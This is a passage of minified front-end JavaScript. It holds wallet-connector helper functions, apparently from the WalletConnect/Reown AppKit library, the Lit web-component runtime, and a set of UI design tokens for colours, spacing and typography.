Wallet"&&(!xe.isMobile()||xe.isMobile()&&!e&&!ke.checkInstalled())||n||r)||(t.type==="ANNOUNCED"||t.type==="EXTERNAL")&&(n||r))},getIsConnectedWithWC(){return Array.from(Y.state.chains.values()).some(n=>Ce.getConnectorId(n.namespace)===ge.CONNECTOR_ID.WALLET_CONNECT)},getConnectorTypeOrder({recommended:t,featured:e,custom:n,recent:r,announced:i,injected:s,multiChain:o,external:a,overriddenConnectors:c=de.state.features?.connectorTypeOrder??[]}){const f=[{type:"walletConnect",isEnabled:!0},{type:"recent",isEnabled:r.length>0},{type:"injected",isEnabled:[...s,...i,...o].length>0},{type:"featured",isEnabled:e.length>0},{type:"custom",isEnabled:n&&n.length>0},{type:"external",isEnabled:a.length>0},{type:"recommended",isEnabled:t.length>0}].filter(w=>w.isEnabled),h=new Set(f.map(w=>w.type)),m=c.filter(w=>h.has(w)).map(w=>({type:w,isEnabled:!0})),b=f.filter(({type:w})=>!m.some(({type:E})=>E===w));return Array.from(new Set([...m,...b].map(({type:w})=>w)))},sortConnectorsByExplorerWallet(t){return[...t].sort((e,n)=>e.explorerWallet&&n.explorerWallet?(e.explorerWallet.order??0)-(n.explorerWallet.order??0):e.explorerWallet?-1:n.explorerWallet?1:0)},getAuthName({email:t,socialUsername:e,socialProvider:n}){return e?n&&n==="discord"&&e.endsWith("0")?e.slice(0,-1):e:t.length>30?`${t.slice(0,-3)}...`:t},async fetchProviderData(t){try{if(t.name==="Browser Wallet"&&!xe.isMobile())return{accounts:[],chainId:void 0};if(t.id===ge.CONNECTOR_ID.AUTH)return{accounts:[],chainId:void 0};const[e,n]=await Promise.all([t.provider?.request({method:"eth_accounts"}),t.provider?.request({method:"eth_chainId"}).then(r=>Number(r))]);return{accounts:e,chainId:n}}catch(e){return console.warn(`Failed to fetch provider data for ${t.name}`,e),{accounts:[],chainId:void 0}}},getFilteredCustomWallets(t){const e=Be.getRecentWallets(),n=Ce.state.connectors.map(o=>o.info?.rdns).filter(Boolean),r=e.map(o=>o.rdns).filter(Boolean),i=n.concat(r);if(i.includes("io.metamask.mobile")&&xe.isMobile()){const o=i.indexOf("io.metamask.mobile");i[o]="io.metamask"}return t.filter(o=>!i.includes(String(o?.rdns)))},hasWalletConnector(t){return Ce.state.connectors.some(e=>e.id===t.id||e.name===t.name)},isWalletCompatibleWithCurrentChain(t){const e=Y.state.activeChain;return e&&t.chains?t.chains.some(n=>{const r=n.split(":")[0];return e===r}):!0},getFilteredRecentWallets(){return Be.getRecentWallets().filter(n=>!Uc.isExcluded(n)).filter(n=>!this.hasWalletConnector(n)).filter(n=>this.isWalletCompatibleWithCurrentChain(n))},getCappedRecommendedWallets(t){const{connectors:e}=Ce.state,{customWallets:n,featuredWalletIds:r}=de.state,i=e.find(R=>R.id==="walletConnect"),s=e.filter(R=>R.type==="INJECTED"||R.type==="ANNOUNCED"||R.type==="MULTI_CHAIN");if(!i&&!s.length&&!n?.length)return[];const o=Bk.isEmailEnabled(),a=Bk.isSocialsEnabled(),c=s.filter(R=>R.name!=="Browser Wallet"&&R.name!=="WalletConnect"),l=r?.length||0,f=n?.length||0,h=c.length||0,m=o?1:0,b=a?1:0,w=l+f+h+m+b,E=Math.max(0,4-w);return E<=0?[]:Uc.filterOutDuplicateWallets(t).slice(0,E)}},Ux={interpolate(t,e,n){if(t.length!==2||e.length!==2)throw new Error("inputRange and outputRange must be an array of length 2");const r=t[0]||0,i=t[1]||0,s=e[0]||0,o=e[1]||0;return n<r?s:n>i?o:(o-s)/(i-r)*(n-r)+s}};const ZT=globalThis,VB=ZT.ShadowRoot&&(ZT.ShadyCSS===void 0||ZT.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,WB=Symbol(),KV=new WeakMap;let Aae=class{constructor(e,n,r){if(this._$cssResult$=!0,r!==WB)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=e,this.t=n}get styleSheet(){let e=this.o;const n=this.t;if(VB&&e===void 0){const r=n!==void 0&&n.length===1;r&&(e=KV.get(n)),e===void 0&&((this.o=e=new CSSStyleSheet).replaceSync(this.cssText),r&&KV.set(n,e))}return e}toString(){return this.cssText}};const Su=t=>new Aae(typeof t=="string"?t:t+"",void 0,WB),mr=(t,...e)=>{const n=t.length===1?t[0]:e.reduce(((r,i,s)=>r+(o=>{if(o._$cssResult$===!0)return o.cssText;if(typeof o=="number")return o;throw Error("Value passed to 'css' function must be a 'css' function result: "+o+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(i)+t[s+1]),t[0]);return new Aae(n,t,WB)},P9e=(t,e)=>{if(VB)t.adoptedStyleSheets=e.map((n=>n instanceof CSSStyleSheet?n:n.styleSheet));else for(const n of e){const r=document.createElement("style"),i=ZT.litNonce;i!==void 0&&r.setAttribute("nonce",i),r.textContent=n.cssText,t.appendChild(r)}},ZV=VB?t=>t:t=>t instanceof CSSStyleSheet?(e=>{let n="";for(const r of e.cssRules)n+=r.cssText;return Su(n)})(t):t;const{is:N9e,defineProperty:O9e,getOwnPropertyDescriptor:k9e,getOwnPropertyNames:D9e,getOwnPropertySymbols:B9e,getPrototypeOf:j9e}=Object,u8=globalThis,YV=u8.trustedTypes,M9e=YV?YV.emptyScript:"",U9e=u8.reactiveElementPolyfillSupport,fE=(t,e)=>t,Lx={toAttribute(t,e){switch(e){case Boolean:t=t?M9e:null;break;case Object:case Array:t=t==null?t:JSON.stringify(t)}return t},fromAttribute(t,e){let n=t;switch(e){case Boolean:n=t!==null;break;case Number:n=t===null?null:Number(t);break;case Object:case Array:try{n=JSON.parse(t)}catch{n=null}}return n}},GB=(t,e)=>!N9e(t,e),QV={attribute:!0,type:String,converter:Lx,reflect:!1,useDefault:!1,hasChanged:GB};Symbol.metadata??=Symbol("metadata"),u8.litPropertyMetadata??=new WeakMap;let jb=class extends HTMLElement{static addInitializer(e){this._$Ei(),(this.l??=[]).push(e)}static get observedAttributes(){return this.finalize(),this._$Eh&&[...this._$Eh.keys()]}static createProperty(e,n=QV){if(n.state&&(n.attribute=!1),this._$Ei(),this.prototype.hasOwnProperty(e)&&((n=Object.create(n)).wrapped=!0),this.elementProperties.set(e,n),!n.noAccessor){const r=Symbol(),i=this.getPropertyDescriptor(e,r,n);i!==void 0&&O9e(this.prototype,e,i)}}static getPropertyDescriptor(e,n,r){const{get:i,set:s}=k9e(this.prototype,e)??{get(){return this[n]},set(o){this[n]=o}};return{get:i,set(o){const a=i?.call(this);s?.call(this,o),this.requestUpdate(e,a,r)},configurable:!0,enumerable:!0}}static getPropertyOptions(e){return this.elementProperties.get(e)??QV}static _$Ei(){if(this.hasOwnProperty(fE("elementProperties")))return;const e=j9e(this);e.finalize(),e.l!==void 0&&(this.l=[...e.l]),this.elementProperties=new Map(e.elementProperties)}static finalize(){if(this.hasOwnProperty(fE("finalized")))return;if(this.finalized=!0,this._$Ei(),this.hasOwnProperty(fE("properties"))){const n=this.properties,r=[...D9e(n),...B9e(n)];for(const i of r)this.createProperty(i,n[i])}const e=this[Symbol.metadata];if(e!==null){const n=litPropertyMetadata.get(e);if(n!==void 0)for(const[r,i]of n)this.elementProperties.set(r,i)}this._$Eh=new Map;for(const[n,r]of this.elementProperties){const i=this._$Eu(n,r);i!==void 0&&this._$Eh.set(i,n)}this.elementStyles=this.finalizeStyles(this.styles)}static finalizeStyles(e){const n=[];if(Array.isArray(e)){const r=new Set(e.flat(1/0).reverse());for(const i of r)n.unshift(ZV(i))}else e!==void 0&&n.push(ZV(e));return n}static _$Eu(e,n){const r=n.attribute;return r===!1?void 0:typeof r=="string"?r:typeof e=="string"?e.toLowerCase():void 0}constructor(){super(),this._$Ep=void 0,this.isUpdatePending=!1,this.hasUpdated=!1,this._$Em=null,this._$Ev()}_$Ev(){this._$ES=new Promise((e=>this.enableUpdating=e)),this._$AL=new Map,this._$E_(),this.requestUpdate(),this.constructor.l?.forEach((e=>e(this)))}addController(e){(this._$EO??=new Set).add(e),this.renderRoot!==void 0&&this.isConnected&&e.hostConnected?.()}removeController(e){this._$EO?.delete(e)}_$E_(){const e=new Map,n=this.constructor.elementProperties;for(const r of n.keys())this.hasOwnProperty(r)&&(e.set(r,this[r]),delete this[r]);e.size>0&&(this._$Ep=e)}createRenderRoot(){const e=this.shadowRoot??this.attachShadow(this.constructor.shadowRootOptions);return P9e(e,this.constructor.elementStyles),e}connectedCallback(){this.renderRoot??=this.createRenderRoot(),this.enableUpdating(!0),this._$EO?.forEach((e=>e.hostConnected?.()))}enableUpdating(e){}disconnectedCallback(){this._$EO?.forEach((e=>e.hostDisconnected?.()))}attributeChangedCallback(e,n,r){this._$AK(e,r)}_$ET(e,n){const r=this.constructor.elementProperties.get(e),i=this.constructor._$Eu(e,r);if(i!==void 0&&r.reflect===!0){const s=(r.converter?.toAttribute!==void 0?r.converter:Lx).toAttribute(n,r.type);this._$Em=e,s==null?this.removeAttribute(i):this.setAttribute(i,s),this._$Em=null}}_$AK(e,n){const r=this.constructor,i=r._$Eh.get(e);if(i!==void 0&&this._$Em!==i){const s=r.getPropertyOptions(i),o=typeof s.converter=="function"?{fromAttribute:s.converter}:s.converter?.fromAttribute!==void 0?s.converter:Lx;this._$Em=i;const a=o.fromAttribute(n,s.type);this[i]=a??this._$Ej?.get(i)??a,this._$Em=null}}requestUpdate(e,n,r){if(e!==void 0){const i=this.constructor,s=this[e];if(r??=i.getPropertyOptions(e),!((r.hasChanged??GB)(s,n)||r.useDefault&&r.reflect&&s===this._$Ej?.get(e)&&!this.hasAttribute(i._$Eu(e,r))))return;this.C(e,n,r)}this.isUpdatePending===!1&&(this._$ES=this._$EP())}C(e,n,{useDefault:r,reflect:i,wrapped:s},o){r&&!(this._$Ej??=new Map).has(e)&&(this._$Ej.set(e,o??n??this[e]),s!==!0||o!==void 0)||(this._$AL.has(e)||(this.hasUpdated||r||(n=void 0),this._$AL.set(e,n)),i===!0&&this._$Em!==e&&(this._$Eq??=new Set).add(e))}async _$EP(){this.isUpdatePending=!0;try{await this._$ES}catch(n){Promise.reject(n)}const e=this.scheduleUpdate();return e!=null&&await e,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){if(!this.isUpdatePending)return;if(!this.hasUpdated){if(this.renderRoot??=this.createRenderRoot(),this._$Ep){for(const[i,s]of this._$Ep)this[i]=s;this._$Ep=void 0}const r=this.constructor.elementProperties;if(r.size>0)for(const[i,s]of r){const{wrapped:o}=s,a=this[i];o!==!0||this._$AL.has(i)||a===void 0||this.C(i,void 0,s,a)}}let e=!1;const n=this._$AL;try{e=this.shouldUpdate(n),e?(this.willUpdate(n),this._$EO?.forEach((r=>r.hostUpdate?.())),this.update(n)):this._$EM()}catch(r){throw e=!1,this._$EM(),r}e&&this._$AE(n)}willUpdate(e){}_$AE(e){this._$EO?.forEach((n=>n.hostUpdated?.())),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(e)),this.updated(e)}_$EM(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$ES}shouldUpdate(e){return!0}update(e){this._$Eq&&=this._$Eq.forEach((n=>this._$ET(n,this[n]))),this._$EM()}updated(e){}firstUpdated(e){}};jb.elementStyles=[],jb.shadowRootOptions={mode:"open"},jb[fE("elementProperties")]=new Map,jb[fE("finalized")]=new Map,U9e?.({ReactiveElement:jb}),(u8.reactiveElementVersions??=[]).push("2.1.1");const KB=globalThis,Fx=KB.trustedTypes,JV=Fx?Fx.createPolicy("lit-html",{createHTML:t=>t}):void 0,Cae="$lit$",pp=`lit$${Math.random().toFixed(9).slice(2)}$`,Sae="?"+pp,L9e=`<${Sae}>`,ug=document,f_=()=>ug.createComment(""),h_=t=>t===null||typeof t!="object"&&typeof t!="function",ZB=Array.isArray,F9e=t=>ZB(t)||typeof t?.[Symbol.iterator]=="function",H9=`[ 	
\f\r]`,Bv=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,XV=/-->/g,eW=/>/g,J0=RegExp(`>|${H9}(?:([^\\s"'>=/]+)(${H9}*=${H9}*(?:[^ 	
\f\r"'\`<>=]|("|')|))|$)`,"g"),tW=/'/g,nW=/"/g,Tae=/^(?:script|style|textarea|title)$/i,xae=t=>(e,...n)=>({_$litType$:t,strings:e,values:n}),X=xae(1),Mt=xae(2),lg=Symbol.for("lit-noChange"),bi=Symbol.for("lit-nothing"),rW=new WeakMap,Fm=ug.createTreeWalker(ug,129);function Iae(t,e){if(!ZB(t)||!t.hasOwnProperty("raw"))throw Error("invalid template strings array");return JV!==void 0?JV.createHTML(e):e}const $9e=(t,e)=>{const n=t.length-1,r=[];let i,s=e===2?"<svg>":e===3?"<math>":"",o=Bv;for(let a=0;a<n;a++){const c=t[a];let l,f,h=-1,m=0;for(;m<c.length&&(o.lastIndex=m,f=o.exec(c),f!==null);)m=o.lastIndex,o===Bv?f[1]==="!--"?o=XV:f[1]!==void 0?o=eW:f[2]!==void 0?(Tae.test(f[2])&&(i=RegExp("</"+f[2],"g")),o=J0):f[3]!==void 0&&(o=J0):o===J0?f[0]===">"?(o=i??Bv,h=-1):f[1]===void 0?h=-2:(h=o.lastIndex-f[2].length,l=f[1],o=f[3]===void 0?J0:f[3]==='"'?nW:tW):o===nW||o===tW?o=J0:o===XV||o===eW?o=Bv:(o=J0,i=void 0);const b=o===J0&&t[a+1].startsWith("/>")?" ":"";s+=o===Bv?c+L9e:h>=0?(r.push(l),c.slice(0,h)+Cae+c.slice(h)+pp+b):c+pp+(h===-2?a:b)}return[Iae(t,s+(t[n]||"<?>")+(e===2?"</svg>":e===3?"</math>":"")),r]};let B7=class Rae{constructor({strings:e,_$litType$:n},r){let i;this.parts=[];let s=0,o=0;const a=e.length-1,c=this.parts,[l,f]=$9e(e,n);if(this.el=Rae.createElement(l,r),Fm.currentNode=this.el.content,n===2||n===3){const h=this.el.content.firstChild;h.replaceWith(...h.childNodes)}for(;(i=Fm.nextNode())!==null&&c.length<a;){if(i.nodeType===1){if(i.hasAttributes())for(const h of i.getAttributeNames())if(h.endsWith(Cae)){const m=f[o++],b=i.getAttribute(h).split(pp),w=/([.?@])?(.*)/.exec(m);c.push({type:1,index:s,name:w[2],strings:b,ctor:w[1]==="."?z9e:w[1]==="?"?q9e:w[1]==="@"?V9e:l8}),i.removeAttribute(h)}else h.startsWith(pp)&&(c.push({type:6,index:s}),i.removeAttribute(h));if(Tae.test(i.tagName)){const h=i.textContent.split(pp),m=h.length-1;if(m>0){i.textContent=Fx?Fx.emptyScript:"";for(let b=0;b<m;b++)i.append(h[b],f_()),Fm.nextNode(),c.push({type:2,index:++s});i.append(h[m],f_())}}}else if(i.nodeType===8)if(i.data===Sae)c.push({type:2,index:s});else{let h=-1;for(;(h=i.data.indexOf(pp,h+1))!==-1;)c.push({type:7,index:s}),h+=pp.length-1}s++}}static createElement(e,n){const r=ug.createElement("template");return r.innerHTML=e,r}};function x1(t,e,n=t,r){if(e===lg)return e;let i=r!==void 0?n._$Co?.[r]:n._$Cl;const s=h_(e)?void 0:e._$litDirective$;return i?.constructor!==s&&(i?._$AO?.(!1),s===void 0?i=void 0:(i=new s(t),i._$AT(t,n,r)),r!==void 0?(n._$Co??=[])[r]=i:n._$Cl=i),i!==void 0&&(e=x1(t,i._$AS(t,e.values),i,r)),e}let H9e=class{constructor(e,n){this._$AV=[],this._$AN=void 0,this._$AD=e,this._$AM=n}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(e){const{el:{content:n},parts:r}=this._$AD,i=(e?.creationScope??ug).importNode(n,!0);Fm.currentNode=i;let s=Fm.nextNode(),o=0,a=0,c=r[0];for(;c!==void 0;){if(o===c.index){let l;c.type===2?l=new sA(s,s.nextSibling,this,e):c.type===1?l=new c.ctor(s,c.name,c.strings,this,e):c.type===6&&(l=new W9e(s,this,e)),this._$AV.push(l),c=r[++a]}o!==c?.index&&(s=Fm.nextNode(),o++)}return Fm.currentNode=ug,i}p(e){let n=0;for(const r of this._$AV)r!==void 0&&(r.strings!==void 0?(r._$AI(e,r,n),n+=r.strings.length-2):r._$AI(e[n])),n++}};class sA{get _$AU(){return this._$AM?._$AU??this._$Cv}constructor(e,n,r,i){this.type=2,this._$AH=bi,this._$AN=void 0,this._$AA=e,this._$AB=n,this._$AM=r,this.options=i,this._$Cv=i?.isConnected??!0}get parentNode(){let e=this._$AA.parentNode;const n=this._$AM;return n!==void 0&&e?.nodeType===11&&(e=n.parentNode),e}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(e,n=this){e=x1(this,e,n),h_(e)?e===bi||e==null||e===""?(this._$AH!==bi&&this._$AR(),this._$AH=bi):e!==this._$AH&&e!==lg&&this._(e):e._$litType$!==void 0?this.$(e):e.nodeType!==void 0?this.T(e):F9e(e)?this.k(e):this._(e)}O(e){return this._$AA.parentNode.insertBefore(e,this._$AB)}T(e){this._$AH!==e&&(this._$AR(),this._$AH=this.O(e))}_(e){this._$AH!==bi&&h_(this._$AH)?this._$AA.nextSibling.data=e:this.T(ug.createTextNode(e)),this._$AH=e}$(e){const{values:n,_$litType$:r}=e,i=typeof r=="number"?this._$AC(e):(r.el===void 0&&(r.el=B7.createElement(Iae(r.h,r.h[0]),this.options)),r);if(this._$AH?._$AD===i)this._$AH.p(n);else{const s=new H9e(i,this),o=s.u(this.options);s.p(n),this.T(o),this._$AH=s}}_$AC(e){let n=rW.get(e.strings);return n===void 0&&rW.set(e.strings,n=new B7(e)),n}k(e){ZB(this._$AH)||(this._$AH=[],this._$AR());const n=this._$AH;let r,i=0;for(const s of e)i===n.length?n.push(r=new sA(this.O(f_()),this.O(f_()),this,this.options)):r=n[i],r._$AI(s),i++;i<n.length&&(this._$AR(r&&r._$AB.nextSibling,i),n.length=i)}_$AR(e=this._$AA.nextSibling,n){for(this._$AP?.(!1,!0,n);e!==this._$AB;){const r=e.nextSibling;e.remove(),e=r}}setConnected(e){this._$AM===void 0&&(this._$Cv=e,this._$AP?.(e))}}let l8=class{get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}constructor(e,n,r,i,s){this.type=1,this._$AH=bi,this._$AN=void 0,this.element=e,this.name=n,this._$AM=i,this.options=s,r.length>2||r[0]!==""||r[1]!==""?(this._$AH=Array(r.length-1).fill(new String),this.strings=r):this._$AH=bi}_$AI(e,n=this,r,i){const s=this.strings;let o=!1;if(s===void 0)e=x1(this,e,n,0),o=!h_(e)||e!==this._$AH&&e!==lg,o&&(this._$AH=e);else{const a=e;let c,l;for(e=s[0],c=0;c<s.length-1;c++)l=x1(this,a[r+c],n,c),l===lg&&(l=this._$AH[c]),o||=!h_(l)||l!==this._$AH[c],l===bi?e=bi:e!==bi&&(e+=(l??"")+s[c+1]),this._$AH[c]=l}o&&!i&&this.j(e)}j(e){e===bi?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,e??"")}};class z9e extends l8{constructor(){super(...arguments),this.type=3}j(e){this.element[this.name]=e===bi?void 0:e}}class q9e extends l8{constructor(){super(...arguments),this.type=4}j(e){this.element.toggleAttribute(this.name,!!e&&e!==bi)}}let V9e=class extends l8{constructor(e,n,r,i,s){super(e,n,r,i,s),this.type=5}_$AI(e,n=this){if((e=x1(this,e,n,0)??bi)===lg)return;const r=this._$AH,i=e===bi&&r!==bi||e.capture!==r.capture||e.once!==r.once||e.passive!==r.passive,s=e!==bi&&(r===bi||i);i&&this.element.removeEventListener(this.name,this,r),s&&this.element.addEventListener(this.name,this,e),this._$AH=e}handleEvent(e){typeof this._$AH=="function"?this._$AH.call(this.options?.host??this.element,e):this._$AH.handleEvent(e)}};class W9e{constructor(e,n,r){this.element=e,this.type=6,this._$AN=void 0,this._$AM=n,this.options=r}get _$AU(){return this._$AM._$AU}_$AI(e){x1(this,e)}}const G9e=KB.litHtmlPolyfillSupport;G9e?.(B7,sA),(KB.litHtmlVersions??=[]).push("3.3.1");const K9e=(t,e,n)=>{const r=n?.renderBefore??e;let i=r._$litPart$;if(i===void 0){const s=n?.renderBefore??null;r._$litPart$=i=new sA(e.insertBefore(f_(),s),s,void 0,n??{})}return i._$AI(t),i};const YB=globalThis;let $e=class extends jb{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){const e=super.createRenderRoot();return this.renderOptions.renderBefore??=e.firstChild,e}update(e){const n=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(e),this._$Do=K9e(n,this.renderRoot,this.renderOptions)}connectedCallback(){super.connectedCallback(),this._$Do?.setConnected(!0)}disconnectedCallback(){super.disconnectedCallback(),this._$Do?.setConnected(!1)}render(){return lg}};$e._$litElement$=!0,$e.finalized=!0,YB.litElementHydrateSupport?.({LitElement:$e});const Z9e=YB.litElementPolyfillSupport;Z9e?.({LitElement:$e});(YB.litElementVersions??=[]).push("4.2.1");const Y9e={black:"#202020",white:"#FFFFFF",white010:"rgba(255, 255, 255, 0.1)",accent010:"rgba(9, 136, 240, 0.1)",accent020:"rgba(9, 136, 240, 0.2)",accent030:"rgba(9, 136, 240, 0.3)",accent040:"rgba(9, 136, 240, 0.4)",accent050:"rgba(9, 136, 240, 0.5)",accent060:"rgba(9, 136, 240, 0.6)",accent070:"rgba(9, 136, 240, 0.7)",accent080:"rgba(9, 136, 240, 0.8)",accent090:"rgba(9, 136, 240, 0.9)",accent100:"rgba(9, 136, 240, 1.0)",accentSecondary010:"rgba(199, 185, 148, 0.1)",accentSecondary020:"rgba(199, 185, 148, 0.2)",accentSecondary030:"rgba(199, 185, 148, 0.3)",accentSecondary040:"rgba(199, 185, 148, 0.4)",accentSecondary050:"rgba(199, 185, 148, 0.5)",accentSecondary060:"rgba(199, 185, 148, 0.6)",accentSecondary070:"rgba(199, 185, 148, 0.7)",accentSecondary080:"rgba(199, 185, 148, 0.8)",accentSecondary090:"rgba(199, 185, 148, 0.9)",accentSecondary100:"rgba(199, 185, 148, 1.0)",productWalletKit:"#FFB800",productAppKit:"#FF573B",productCloud:"#0988F0",productDocumentation:"#008847",neutrals050:"#F6F6F6",neutrals100:"#F3F3F3",neutrals200:"#E9E9E9",neutrals300:"#D0D0D0",neutrals400:"#BBB",neutrals500:"#9A9A9A",neutrals600:"#6C6C6C",neutrals700:"#4F4F4F",neutrals800:"#363636",neutrals900:"#2A2A2A",neutrals1000:"#252525",semanticSuccess010:"rgba(48, 164, 107, 0.1)",semanticSuccess020:"rgba(48, 164, 107, 0.2)",semanticSuccess030:"rgba(48, 164, 107, 0.3)",semanticSuccess040:"rgba(48, 164, 107, 0.4)",semanticSuccess050:"rgba(48, 164, 107, 0.5)",semanticSuccess060:"rgba(48, 164, 107, 0.6)",semanticSuccess070:"rgba(48, 164, 107, 0.7)",semanticSuccess080:"rgba(48, 164, 107, 0.8)",semanticSuccess090:"rgba(48, 164, 107, 0.9)",semanticSuccess100:"rgba(48, 164, 107, 1.0)",semanticError010:"rgba(223, 74, 52, 0.1)",semanticError020:"rgba(223, 74, 52, 0.2)",semanticError030:"rgba(223, 74, 52, 0.3)",semanticError040:"rgba(223, 74, 52, 0.4)",semanticError050:"rgba(223, 74, 52, 0.5)",semanticError060:"rgba(223, 74, 52, 0.6)",semanticError070:"rgba(223, 74, 52, 0.7)",semanticError080:"rgba(223, 74, 52, 0.8)",semanticError090:"rgba(223, 74, 52, 0.9)",semanticError100:"rgba(223, 74, 52, 1.0)",semanticWarning010:"rgba(243, 161, 63, 0.1)",semanticWarning020:"rgba(243, 161, 63, 0.2)",semanticWarning030:"rgba(243, 161, 63, 0.3)",semanticWarning040:"rgba(243, 161, 63, 0.4)",semanticWarning050:"rgba(243, 161, 63, 0.5)",semanticWarning060:"rgba(243, 161, 63, 0.6)",semanticWarning070:"rgba(243, 161, 63, 0.7)",semanticWarning080:"rgba(243, 161, 63, 0.8)",semanticWarning090:"rgba(243, 161, 63, 0.9)",semanticWarning100:"rgba(243, 161, 63, 1.0)"},$x={core:{backgroundAccentPrimary:"#0988F0",backgroundAccentCertified:"#C7B994",backgroundWalletKit:"#FFB800",backgroundAppKit:"#FF573B",backgroundCloud:"#0988F0",backgroundDocumentation:"#008847",backgroundSuccess:"rgba(48, 164, 107, 0.20)",backgroundError:"rgba(223, 74, 52, 0.20)",backgroundWarning:"rgba(243, 161, 63, 0.20)",textAccentPrimary:"#0988F0",textAccentCertified:"#C7B994",textWalletKit:"#FFB800",textAppKit:"#FF573B",textCloud:"#0988F0",textDocumentation:"#008847",textSuccess:"#30A46B",textError:"#DF4A34",textWarning:"#F3A13F",borderAccentPrimary:"#0988F0",borderSecondary:"#C7B994",borderSuccess:"#30A46B",borderError:"#DF4A34",borderWarning:"#F3A13F",foregroundAccent010:"rgba(9, 136, 240, 0.1)",foregroundAccent020:"rgba(9, 136, 240, 0.2)",foregroundAccent040:"rgba(9, 136, 240, 0.4)",foregroundAccent060:"rgba(9, 136, 240, 0.6)",foregroundSecondary020:"rgba(199, 185, 148, 0.2)",foregroundSecondary040:"rgba(199, 185, 148, 0.4)",foregroundSecondary060:"rgba(199, 185, 148, 0.6)",iconAccentPrimary:"#0988F0",iconAccentCertified:"#C7B994",iconSuccess:"#30A46B",iconError:"#DF4A34",iconWarning:"#F3A13F",glass010:"rgba(255, 255, 255, 0.1)",zIndex:"9999"},dark:{overlay:"rgba(0, 0, 0, 0.50)",backgroundPrimary:"#202020",backgroundInvert:"#FFFFFF",textPrimary:"#FFFFFF",textSecondary:"#9A9A9A",textTertiary:"#BBBBBB",textInvert:"#202020",borderPrimary:"#2A2A2A",borderPrimaryDark:"#363636",borderSecondary:"#4F4F4F",foregroundPrimary:"#252525",foregroundSecondary:"#2A2A2A",foregroundTertiary:"#363636",iconDefault:"#9A9A9A",iconInverse:"#FFFFFF"},light:{overlay:"rgba(230 , 230, 230, 0.5)",backgroundPrimary:"#FFFFFF",borderPrimaryDark:"#E9E9E9",backgroundInvert:"#202020",textPrimary:"#202020",textSecondary:"#9A9A9A",textTertiary:"#6C6C6C",textInvert:"#FFFFFF",borderPrimary:"#E9E9E9",borderSecondary:"#D0D0D0",foregroundPrimary:"#F3F3F3",foregroundSecondary:"#E9E9E9",foregroundTertiary:"#D0D0D0",iconDefault:"#9A9A9A",iconInverse:"#202020"}},Q9e={1:"4px",2:"8px",10:"10px",3:"12px",4:"16px",6:"24px",5:"20px",8:"32px",16:"64px",20:"80px",32:"128px",64:"256px",128:"512px",round:"9999px"},J9e={0:"0px","01":"2px",1:"4px",2:"8px",3:"12px",4:"16px",5:"20px",6:"24px",7:"28px",8:"32px",9:"36px",10:"40px",12:"48px",14:"56px",16:"64px",20:"80px",32:"128px",64:"256px"},X9e={regular:"KHTeka",mono:"KHTekaMono"},eOe={regular:"400",medium:"500"},tOe={h1:"50px",h2:"44px",h3:"38px",h4:"32px",h5:"26px",h6:"20px",large:"16px",medium:"14px",small:"12px"},nOe={"h1-regular-mono":{lineHeight:"50px",letterSpacing:"-3px"},"h1-regular":{lineHeight:"50px",letterSpacing:"-1px"},"h1-medium":{lineHeight:"50px",letterSpacing:"-0.84px"},"h2-regular-mono":{lineHeight:"44px",letterSpacing:"-2.64px"},"h2-regular":{lineHeight:"44px",letterSpacing:"-0.88px"},"h2-medium":{lineHeight:"44px",letterSpacing:"-0.88px"},"h3-regular-mono":{lineHeight:"38px",letterSpacing:"-2.28px"},"h3-regular":{lineHeight:"38px",letterSpacing:"-0.76px"},"h3-medium":{lineHeight:"38px",letterSpacing:"-0.76px"},"h4-regular-mono":{lineHeight:"32px",letterSpacing:"-1.92px"},"h4-regular":{lineHeight:"32px",letterSpacing:"-0.32px"},"h4-medium":{lineHeight:"32px",letterSpacing:"-0.32px"},"h5-regular-mono":{lineHeight:"26px",letterSpacing:"-1.56px"},"h5-regular":{lineHeight:"26px",letterSpacing:"-0.26px"},"h5-medium":{lineHeight:"26px",letterSpacing:"-0.26px"},"h6-regular-mono":{lineHeight:"20px",letterSpacing:"-1.2px"},"h6-regular":{lineHeight:"20px",letterSpacing:"-0.6px"},"h6-medium":{lineHeight:"20px",letterSpacing:"-0.6px"},"lg-regular-mono":{lineHeight:"16px",letterSpacing:"-0.96px"},"lg-regular":{lineHeight:"18px",letterSpacing:"-0.16px"},"lg-medium":{lineHeight:"18px",letterSpacing:"-0.16px"},"md-regular-mono":{lineHeight:"14px",letterSpacing:"-0.84px"},"md-regular":{lineHeight:"16px",letterSpacing:"-0.14px"},"md-medium":{lineHeight:"16px",letterSpacing:"-0.14px"},"sm-regular-mono":{lineHeight:"12px",letterSpacing:"-0.72px"},"sm-regular":{lineHeight:"14px",letterSpacing:"-0.12px"},"sm-medium":{lineHeight:"14px",letterSpacing:"-0.12px"}},rOe={"ease-out-power-2":"cubic-bezier(0.23, 0.09, 0.08, 1.13)","ease-out-power-1":"cubic-bezier(0.12, 0.04, 0.2, 1.06)","ease-in-power-2":"cubic-bezier(0.92, -0.13, 0.77, 0.91)","ease-in-power-1":"cubic-bezier(0.88, -0.06, 0.8, 0.96)","ease-inout-power-2":"cubic-bezier(0.77, 0.09, 0.23, 1.13)","ease-inout-power-1":"cubic-bezier(0.88, 0.04, 0.12, 1.06)"},iOe={xl:"400ms",lg:"200ms",md:"125ms",sm:"75ms"},j7={colors:Y9e,fontFamily:X9e,fontWeight:eOe,textSize:tOe,typography:nOe,tokens:{core:$x.core,theme:$x.dark},borderRadius:Q9e,spacing:J9e,durations:iOe,easings:rOe},iW="--apkt";function e6(t){if(!t)return{};const e={};return 